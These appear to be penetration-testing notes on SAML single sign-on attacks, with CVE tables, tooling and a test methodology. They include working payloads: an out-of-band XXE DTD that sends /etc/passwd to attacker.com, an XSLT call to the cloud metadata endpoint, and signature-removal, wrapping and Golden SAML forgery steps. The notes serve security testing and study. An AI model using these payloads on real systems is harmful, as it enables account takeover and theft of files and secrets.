+++
title = 'SAML Attacks'
date = 2026-10-30
type = 'notes'
weight = 90
toc = true
tags = ['web', 'web-attacks', 'saml', 'authentication']
+++

Security Assertion Markup Language (SAML) is an XML-based standard for authentication and authorization between parties, widely used to implement Single Sign-On (SSO). Data is exchanged in digitally signed XML documents, and the security of the entire federation rests on one assumption: **the element the Service Provider cryptographically verifies is the same element its application code reads the username from.**

> **2025–2026 context:** SAML is built on XML, and XML's parser complexity has produced a **persistent stream of critical authentication-bypass CVEs** across every major language ecosystem. The 2025 PortSwigger "Fragile Lock" research introduced **attribute pollution, namespace confusion, and Void Canonicalization** as new XSW classes. The current CVE feed is dominated by **signature wrapping in libraries** (authentik, Net::SAML2, ruby-saml, Nokogiri), **replay and missing `Conditions` validation** (Casdoor, Logto, Snipe-IT, Keycloak), and **XML comment injection** (authentik).

<details>
<summary>SAML Basic Overview</summary>

### SAML Components

1. **Identity Provider (IdP)** — authenticates users and issues **SAML assertions** containing identity and authorization information.
2. **Service Provider (SP)** — the application the user wants to access. It relies on the IdP's assertions.
3. **SAML Assertions** — XML documents containing authentication and authorization details, **digitally signed** to ensure integrity and trust.

### Authentication Flow

1. User accesses the SP.
2. The SP sends a **SAML authentication request** to the IdP (via browser redirection).
3. The user authenticates with the IdP.
4. The IdP creates a **digitally signed SAML assertion** and sends it to the browser.
5. The browser forwards the assertion to the SP.
6. The SP **verifies** the assertion.
7. Access is granted.

### Key XML Structure

```xml
<samlp:Response>
  <saml:Assertion ID="_asrt001">
    <ds:Signature>...</ds:Signature>
    <saml:Subject>
      <saml:NameID>alice</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

</details>

---

## 1. Identifying SAML Authentication

When authenticating via SAML, you are redirected to the IdP with a **`SAMLRequest`** parameter:

```
/saml/idp/SSOService.php?SAMLRequest=<value>
```

The value is **URL-decoded**, then **Base64-decoded and inflated** (deflate) to reveal the XML. The **`SAMLResponse`** returned after authentication is **not inflated** — it is only URL-decoded and Base64-decoded.

### 1.1 Discovery and reconnaissance

- **Burp**: watch for `SAMLRequest` / `SAMLResponse` in proxy history.
- **Browser**: SAML Tracer (Firefox) shows the full flow.
- **IdP metadata**: append `/FederationMetadata/2007-06/FederationMetadata.xml` (ADFS) or `/.well-known/saml-configuration` to the IdP base URL.
- **SP metadata**: look for `/saml/metadata`, `/Shibboleth.sso/Metadata`, or a `<EntityDescriptor>` document.

### 1.2 Decoding tools

- [SAMLTool — decode](https://www.samltool.com/decode.php)
- `base64 -d | python3 -c "import sys,zlib; print(zlib.decompress(sys.stdin.buffer.read(), -15).decode())"` for `SAMLRequest`
- `base64 -d` only for `SAMLResponse`

---

## 2. Signature Exclusion

If the SP **verifies the signature only when one is present** — and defaults to **accepting the response when it is absent** — removing the `ds:Signature` element turns the assertion into an unsigned, editable document.

### 2.1 The attack

1. Log in via SAML with a valid account and capture the `SAMLResponse`.
2. URL-decode and Base64-decode it to obtain the XML.
3. **Edit the identity fields** — change `NameID`, `AttributeValue`, or add a role attribute:
   ```xml
   <saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
   ```
4. **Remove every `ds:Signature` element** from the document.
5. Base64-encode and URL-encode the modified XML.
6. Replay it to the SP's ACS endpoint.

If the SP accepts the modified assertion, the signature is not enforced.

> **Why this happens:** the SAML library's `verify()` method returns `true` when there is nothing to verify, rather than failing closed. This is a **CWE-347** class bug and is the same logic that produces "no token = no check" in JWT.

---

## 3. Signature Wrapping (XSW)

**XML Signature Wrapping** exploits the gap between **the element the SP verifies** and **the element the SP reads**. The attacker keeps the legitimate signed assertion intact, and **adds a forged, unsigned assertion earlier in the document** so that the SP's `getElementsByTagName` / XPath lookup finds the forged one first — while the signature still validates the original.

### 3.1 The fundamental flaw

XML Signature verification splits into two independent steps:

1. **Reference validation** — dereference the `<ds:Reference URI="#_asrt001">`, apply transforms, digest the result.
2. **Signature validation** — verify the `<ds:SignatureValue>` over `<ds:SignedInfo>`.

The application then performs a **separate** XPath or DOM lookup to extract the username. **These two code paths do not share state**. The signature covers the element named in the URI; the application reads the **first matching element in document order**. Insert a forged assertion before the signed one, and the SP verifies the signed assertion but authenticates the forged one.

**CVE-2026-18092 (Net::SAML2)** is the canonical 2026 example: `new_from_xml` reads `//saml:Subject/saml:NameID` — a **document-wide XPath** — while `XML::Sig` verifies only the element named by the `Reference URI`. An attacker with **any** IdP-signed assertion adds an unsigned one earlier in document order and authenticates as an arbitrary user.

### 3.2 The common XSW variants

| Variant | Structure |
|---|---|
| **XSW1** | Forged assertion as a sibling **before** the signed one |
| **XSW2** | Forged assertion nested **inside** the signed assertion's `<Extensions>` or `<Advice>` |
| **XSW3** | Forged assertion as a sibling **after** the signed one, with the signature moved |
| **XSW4** | Signature moved to a **detached** location, forged assertion in the original position |
| **XSW5** | Forged assertion in `<Object>` inside the `<Signature>` |
| **XSW6** | Signature over the **`<Response>`** rather than the assertion, with a forged assertion injected |
| **XSW7** | Forged assertion in a **different namespace** so the parser and the verifier disagree |
| **XSW8** | Forged assertion wrapped in an **`<Extensions>`** element |

**SAML Raider** automates **eight common XSW attacks** and handles decoding, editing, and re-signing.

### 3.3 Novel 2025–2026 XSW classes — "The Fragile Lock"

The December 2025 PortSwigger research introduced **three new bypass families** that work even against libraries that correctly scope the signature to the assertion:

| Class | Mechanism |
|---|---|
| **Attribute pollution** | Duplicate `ID` attributes or conflicting `NameID` elements cause the verifier and the application to resolve **different values** from the same document. The signature covers one; the application reads the other |
| **Namespace confusion** | Elements from **different XML namespaces** with the same local name are resolved differently by the verifier and the application — the signature validates one namespace, the SP reads the other |
| **Void Canonicalization** | **Canonicalization** (C14N) normalizes XML before digesting. A "void" canonicalization attack exploits inputs where C14N **silently drops or reorders** content, producing a valid signature over a document that means something different to the application |

**CVE-2025-66568** is the Nokogiri/libxml2 instance of a canonicalization bypass: an invalid XML input passed through `libxml2` canonicalization enables a signature-wrapping attack **up to and including ruby-saml 1.12.4**.

> **The toolkit:** the PortSwigger research released an **open-source toolkit for detecting parser discrepancies** — the same document is fed to multiple XML parsers, and the differences in what each one resolves are the exploitable surface. This is the 2026 equivalent of `rsa_sign2n` for JWT: a way to find the bypass empirically rather than guessing at variant numbers.

### 3.4 Real-world XSW CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2026-47201** | authentik < 2025.12.5 / 2026.2.3 / 2026.5.1 | SAML Source ACS **XSW** — any upstream IdP account reuses a valid signed assertion to authenticate as another federated user |
| **CVE-2026-18092** | Net::SAML2 < 0.86 (Perl) | **Document-wide XPath** reads `NameID` outside the signed subtree |
| **CVE-2025-25291** | ruby-saml < 1.12.4 / 1.18.0 | **Parser differential** → XSW, CVSS 9.8 |
| **CVE-2025-66568** | Nokogiri / libxml2 | **Canonicalization** bypass → XSW |
| **CVE-2025-46572** | Okta Passport-WS-Fed | XSW → impersonate any user |
| **CVE-2025-54369** | Node-SAML ≤ 5.0.1 | Modifies authentication details **within a valid assertion** — e.g. removes a character from the username |
| **BIT-AUTHENTIK-2026-25922** | authentik | Signature verification bypass via **assertion wrapping** when "Verify Assertion Signature" is on but "Verify Response Signature" is off |
| **CVE-2022-41912** | crewjam/saml (Go) < 0.4.9 | Multiple `Assertion` elements, CVSS 9.8 — **still the reference case** |

---

## 4. XML Comment Injection

**CVE-2026-40165 (authentik)**: versions ≤ 2025.12.4 and 2026.2.0-rc1 through 2026.2.2 were vulnerable to **authentication bypass through SAML `NameID` XML comment injection**.

If the SP uses the `NameID` value **without stripping XML comments**, an attacker can inject a comment to alter how the value is parsed:

```xml
<saml:NameID>admin<!-- -->@evil.com</saml:NameID>
```

Depending on where the comment lands, the SP may resolve the value as `admin`, as `admin@evil.com`, or as `@evil.com` — and one of those is the privileged account the attacker wants.

**CVE-2026-55789 (Logto)**: an authenticated low-privilege user could place **XML markup in a profile attribute** so that Logto signed a **forged SAML attribute**.

---

## 5. Assertion Replay and `Conditions` Validation

A SAML assertion is valid **once**, for a **specific audience**, within a **specific time window**. Every one of those constraints lives in the `<Conditions>` element:

```xml
<saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2026-01-01T00:05:00Z">
  <saml:AudienceRestriction>
    <saml:Audience>https://sp.example.com</saml:Audience>
  </saml:AudienceRestriction>
  <saml:OneTimeUse/>
</saml:Conditions>
```

**If the SP does not enforce these**, a captured assertion can be replayed **indefinitely**.

### 5.1 Real-world replay CVEs (2025–2026)

| CVE | Product | Failure |
|---|---|---|
| **CVE-2026-9095** | Casdoor ≤ 2.362.0 | No assertion ID cache, no `OneTimeUse`, no replay detection — replay a captured assertion to authenticate as **anyone, including administrators**, without password or MFA |
| **CVE-2026-15615** | Logto | **`<Conditions>` not validated** — attackers strip time and audience restrictions and replay indefinitely |
| **CVE-2026-41577** | authentik | `ResponseProcessor.parse()` does not validate `Conditions` — replay of **expired assertions** and acceptance of assertions intended for **other SPs** |
| **CVE-2026-94612** | authentik < 2026.2.7 / 2026.5.7 / 2026.8.2 | Verifies signature and validity period but **not the audience or the login request** — an assertion issued for **another SP** is accepted, and accepted assertions are not recorded |
| **CVE-2026-116201** | Snipe-IT < 8.5.0 | **Non-atomic nonce check** — concurrent POSTs replay a captured assertion |
| **CVE-2026-18967** | Keycloak SAML broker | Fails to enforce **`OneTimeUse`** in IdP-initiated flow — a captured, unused assertion is replayed multiple times |

> **The pattern:** the signature is valid, the assertion is genuine, and the SP accepts it — because it **does not check who it was issued for, when, or whether it has been used before**.

### 5.2 Testing replay

1. Capture a valid `SAMLResponse` from your own login.
2. Replay it to the ACS endpoint **after the `NotOnOrAfter` window**.
3. Replay it against a **different SP** in the same federation.
4. Replay it **twice in rapid succession** (concurrent requests).
5. Strip or modify the `<Conditions>` element and replay.

A `200` with a session in any of these cases is a replay vulnerability.

---

## 6. XXE in SAML

SAML is XML, and an SP that parses it with a **DTD-processing parser** is an XXE target.

### 6.1 The payload

Inject the DTD **before** the `<samlp:Response>` element:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/dtd"> %xxe; ]>
<samlp:Response>
  ...
</samlp:Response>
```

**Local file read via a parameter entity** — use the error-based or OOB technique from the XXE notes. For a **blind** SP:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
```

### 6.2 Real-world XXE CVEs (2026)

**CVE-2026-28809 / GHSA-4G2H-VM7X-747C (esaml)**: an XXE vulnerability in **esaml and its forks** allows an attacker to cause the host to **read local files** — including **Kubernetes-mounted secrets** — into the SAML document, and potentially perform **SSRF** via crafted SAML messages. On **Erlang/OTP < 27**, Xmerl allows entities **by default**, and `xmerl_scan` runs **before signature verification**.

**CVE-2025-34142 (ETQ Reliance)** — XXE in the `/resources/sessions/sso` endpoint.

> **The critical detail:** in esaml, the XXE fires **before the signature is verified** — the attacker does not need a valid signature to trigger the entity resolution.

---

## 7. XSLT Server-Side Injection

If the SP processes the SAML response through an **XSLT stylesheet** — common in portals that render the assertion as HTML — and the stylesheet is **attacker-influenced**, the `document()` function reads local files or internal URLs.

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
  </xsl:template>
</xsl:stylesheet>
```

Base64-encode and URL-encode the payload, then send it as the `SAMLResponse`.

> **Precondition:** the SP must accept an XSLT stylesheet from the assertion, or the assertion must reach an XSLT processor that resolves `document()`.

---

## 8. Golden SAML

**Golden SAML** forges a SAML assertion signed with the **IdP's token-signing private key**, bypassing the IdP entirely.

### 8.1 The attack

1. Obtain the IdP's **token-signing certificate and private key** — from the ADFS server's `C:\ProgramData\Microsoft\Crypto\` or the `ADFS` service account's `Crypto` folder, or from a compromised IdP.
2. Forge a SAML assertion for any user, with any claims (`role=Domain Admin`).
3. Sign it with the stolen key.
4. POST it to the SP's ACS endpoint.

The SP verifies the signature against the IdP's **public certificate**, which is unchanged — and accepts the assertion as genuine.

### 8.2 Tooling

- **`AADInternals`** — `New-AADIntSAMLToken` generates a Golden SAML token for Azure AD.
- **`shimit`** — Golden SAML for AWS.
- **`saml-generator`** — generic forging.

> **Golden SAML is persistence, not escalation.** The IdP's private key does not expire when a user's password is reset, and it does not require MFA. The only remediation is **certificate rotation** on the IdP.

---

## 9. RelayState Abuse

`RelayState` is an opaque parameter the SP sends with the authentication request and receives back with the response. It is **not signed** and is frequently used as a **return URL** — which makes it an **open redirect** and, in some SPs, an **XSS** vector.

### 9.1 Testing

```http
POST /saml/acs HTTP/1.1
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<...>&RelayState=https://attacker.com
```

If the SP redirects to `RelayState` after authentication, it is an open redirect. If `RelayState` is reflected into the page without encoding, it is reflected XSS.

> **Chained impact:** an open redirect in `RelayState` can be combined with a `redirect_uri`-style bypass to **steal tokens** — the SP redirects to the attacker with the session cookie or a fresh assertion.

---

## 10. Other Attacks

### 10.1 Token Recipient Confusion

A valid assertion issued for **SP-A** is submitted to **SP-B** in the same federation. If SP-B does not check the `<AudienceRestriction>`, it accepts the assertion. This is exactly the **CVE-2026-94612 (authentik)** and **CVE-2026-41577** pattern.

### 10.2 XML Signature `ID` confusion

If the signature references `URI="#_asrt001"` and the document contains **two elements with `ID="_asrt001"`**, the XML parser resolves the reference to one and the application reads the other. This is the **attribute-pollution** class from the Fragile Lock research.

### 10.3 Certificate trust bypass

If the SP accepts a **self-signed certificate** in the `<ds:KeyInfo>` element, or does not pin the IdP certificate, an attacker can sign with their own key and embed the public certificate in the response.

### 10.4 `Destination` and `InResponseTo` omissions

If the SP does not validate the `Destination` attribute (the SP's own ACS URL) or `InResponseTo` (the ID of the request it sent), the assertion can be **relayed across SPs** or **injected into a different session**.

---

## 11. Recent SAML CVEs (2025–2026)

| CVE / Advisory | Product | Class |
|---|---|---|
| **CVE-2026-47201** | authentik | XSW — any upstream IdP account impersonates another federated user |
| **CVE-2026-18092** | Net::SAML2 < 0.86 | Document-wide XPath XSW |
| **CVE-2025-25291** | ruby-saml < 1.12.4 | Parser differential XSW, CVSS 9.8 |
| **CVE-2025-66568** | Nokogiri / libxml2 | Canonicalization → XSW |
| **CVE-2025-46572** | Okta Passport-WS-Fed | XSW → user impersonation |
| **CVE-2025-54369** | Node-SAML ≤ 5.0.1 | Modification within a valid assertion |
| **CVE-2026-40165** | authentik | **NameID XML comment injection** → auth bypass |
| **CVE-2026-55789** | Logto | Profile attribute XML markup → forged SAML attribute |
| **CVE-2026-9095** | Casdoor ≤ 2.362.0 | **No replay protection** — replay to admin |
| **CVE-2026-15615** | Logto | **`<Conditions>` not validated** — strip time/audience |
| **CVE-2026-41577** | authentik | `Conditions` not validated — expired / other-SP replay |
| **CVE-2026-94612** | authentik | Assertion issued for **another SP** accepted; no replay record |
| **CVE-2026-116201** | Snipe-IT < 8.5.0 | **Non-atomic nonce** → concurrent replay |
| **CVE-2026-18967** | Keycloak SAML broker | `OneTimeUse` not enforced → replay |
| **CVE-2026-28809** | esaml (Erlang) | **XXE before signature verification** |
| **CVE-2025-59718 / 59719** | Fortinet FortiOS / FortiWeb | SSO authentication bypass, CVSS 9.8 — **actively exploited** |
| **CVE-2025-34142** | ETQ Reliance | XXE in `/resources/sessions/sso` |

---

## 12. Tooling

| Tool | What it does |
|---|---|
| **SAML Raider** (Burp, **v2.5.2**, Feb 2026) | Decode/edit/re-sign SAML; **8 automated XSW attacks**; XXE and XSLT payload insertion; certificate management |
| **Fragile Lock parser-differential toolkit** | Feeds the same document to multiple XML parsers and reports discrepancies — the 2026 XSW discovery tool |
| **`xmlsec1`** | Command-line XML signature verification and signing |
| **`xmllint`** | XML parsing, canonicalization, and XPath evaluation |
| **SAML Tracer** (Firefox) | Shows the full SAML flow without a proxy |
| **`samlmagic`** | Python library for building and signing assertions |
| **`python3-saml`** | Reference implementation for testing |
| **`fake_idp`** | Hosts a fake IdP for controlled testing |
| **`offsec-ai auth-attack`** | Deep mode includes **SAML XSW** alongside JWT `alg=none` and JWKS confusion |

**SAML Raider quick reference:**

```text
1. Intercept the SAMLResponse in Burp
2. Right-click → "Send to SAML Raider"
3. The SAML message editor opens — decode, edit claims, re-sign
4. "XSW Attacks" tab → choose one of the 8 variants → Apply
5. "Send" — the modified response is forwarded to the SP
```

---

## 13. Testing Methodology

```text
1. Map the flow
   - Intercept SAMLRequest / SAMLResponse
   - Decode and inflate both
   - Record the IdP, SP, ACS URL, and certificate

2. Signature exclusion
   - Remove every <ds:Signature>
   - Edit NameID / AttributeValue
   - Replay

3. Signature wrapping
   - Copy the signed assertion, strip its signature
   - Change its ID
   - Edit the identity fields
   - Inject it before the signed assertion
   - Replay — or run SAML Raider's 8 XSW variants

4. Parser differential (Fragile Lock)
   - Feed the document to multiple XML parsers
   - Look for attribute pollution, namespace confusion,
     Void Canonicalization

5. XML comment injection
   - Inject <!-- --> into NameID
   - Check how the SP resolves the value

6. Replay and Conditions
   - Replay after NotOnOrAfter
   - Replay against a different SP
   - Replay concurrently
   - Strip <Conditions> / <OneTimeUse>

7. XXE
   - Inject a DTD before <samlp:Response>
   - Test local file read, OOB, error-based

8. XSLT
   - Inject an <xsl:stylesheet> with document()
   - Target internal URLs and metadata endpoints

9. RelayState
   - Set it to an external URL — open redirect?
   - Reflect it into the page — XSS?

10. Golden SAML
    - If the IdP signing key is obtainable, forge a token
    - Use AADInternals / shimit
```

---

## 14. Field Notes

- **XSW is 14 years old and still produces CVSS 9.8 CVEs.** CVE-2026-18092 and CVE-2026-47201 are the same class as CVE-2022-41912 — the libraries keep getting the signature scope wrong.
- **The verifier and the application read different elements.** That is the entire bug class. `XML::Sig` verifies the `Reference URI`; `new_from_xml` reads `//saml:Subject/saml:NameID` across the whole document.
- **SAML Raider's 8 XSW variants cover the classic cases; the Fragile Lock classes cover the new ones.** Attribute pollution, namespace confusion, and Void Canonicalization bypass libraries that correctly scope the signature to the assertion.
- **Replay is the most under-tested SAML flaw.** Six 2026 CVEs (Casdoor, Logto, Snipe-IT, Keycloak, authentik ×2) are all failures to enforce `Conditions`, `OneTimeUse`, or the audience — and they allow replay to **administrator accounts**.
- **XXE in SAML fires before signature verification.** esaml's `xmerl_scan` processes entities before it checks the signature — a valid signature is not required to read `/etc/passwd` or Kubernetes secrets.
- **`RelayState` is unsigned and frequently an open redirect.** It is a chain primitive, not a primary finding.
- **Golden SAML is persistence.** The IdP signing key survives password resets and MFA; only certificate rotation remediates it.
- **Check the ACS endpoint, not just `/authorize`.** GHSA-X3F4-V83F-7WP2 in the OAuth notes is the same lesson — six endpoints skipped validation while the rest of the app was correct.
- **Decode first, exploit second.** Every SAML attack starts with URL-decode → Base64-decode (→ inflate for `SAMLRequest`). A tool that does not show you the XML cannot tell you which attack applies.
